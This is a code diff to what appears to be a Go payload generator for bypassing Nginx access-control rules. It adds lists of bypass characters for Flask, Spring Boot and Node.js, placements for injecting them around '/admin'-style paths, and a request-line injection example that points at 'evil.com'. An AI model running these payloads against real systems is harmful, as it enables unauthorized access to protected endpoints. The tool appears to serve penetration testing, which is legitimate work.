@@ -19,6 +19,22 @@ Techniques include:
 - Injecting HTTP version strings after newlines.
 - Injecting full alternative URIs (scheme://host/path) after newlines.
 
+Bypass Characters From Multiple Frameworks:
+Flask: 0x85, 0xA0, 0x1F, 0x1E, 0x1D, 0x1C, 0x0C, 0x0B
+Spring Boot: 0x09, ";"
+Node.js: 0xA0, 0x09, 0x0C
+Special: %0A (newline) for advanced techniques
+
+Injection Techniques:
+Append to end: /admin → /admin<char>
+After trailing slash: /admin → /admin/<char>
+After leading slash: /admin → /<char>admin
+Before leading slash: /admin → <char>/admin ← Malformed URI for normalization bypass
+After each segment: /a/b → /a<char>/b
+Before each segment: /a/b → /a/<char>b
+After first char: /admin → /a<char>dmin
+Complex HTTP version injection: /admin%0AHTTP/1.1%0Ahttp://evil.com/admin
+
 If any generated path segment (before appending the original query) contains
 literal '?' or '#' characters, additional payloads are generated where these
 special characters are percent-encoded (%3F and %23) to ensure the original
@@ -114,17 +130,17 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 	// Handle "/a/b" -> ["a", "b"]
 	var pathSegments []string
 	trimmedPath := strings.TrimPrefix(basePath, "/")
-	if basePath == "/" {
-		pathSegments = []string{""} // Represent root segment explicitly? Or handle differently?
+	switch basePath {
+	case "/":
 		// Let's treat "/" as having one segment "" for insertion logic? No, Split returns [""]
 		// If basePath is just "/", Split("", "/") gives [""].
 		// If basePath is "/a/b", Split("a/b", "/") gives ["a", "b"].
 		// If basePath is "/a/", Split("a/", "/") gives ["a", ""].
 		pathSegments = strings.Split(trimmedPath, "/")
-	} else if basePath == "" {
+	case "":
 		// Treat empty path as root for consistency? No, path is likely intended to be empty.
 		pathSegments = []string{}
-	} else {
+	default:
 		pathSegments = strings.Split(trimmedPath, "/")
 	}
 
@@ -186,7 +202,7 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 		}
 	}
 
-	// 3. Insert characters at the beginning of the path
+	// 3. Insert characters at the beginning of the path (after leading slash)
 	// Need to handle root path "/" carefully
 	leadingSlash := "/"
 	pathWithoutLeadingSlash := strings.TrimPrefix(basePath, "/")
@@ -199,6 +215,15 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 	}
 	for _, encoded := range encodedBypassChars {
 		addJob(leadingSlash + encoded + pathWithoutLeadingSlash)
+	}
+
+	// 3b. Insert characters BEFORE the leading slash (malformed but may bypass normalization)
+	// Generates patterns like <char>/admin/users (this found the Google Cloud LB vulnerability)
+	for _, char := range rawBypassChars {
+		addJob(char + basePath)
+	}
+	for _, encoded := range encodedBypassChars {
+		addJob(encoded + basePath)
 	}
 
 	// 4a. Insert characters immediately AFTER each path segment (before the next '/')
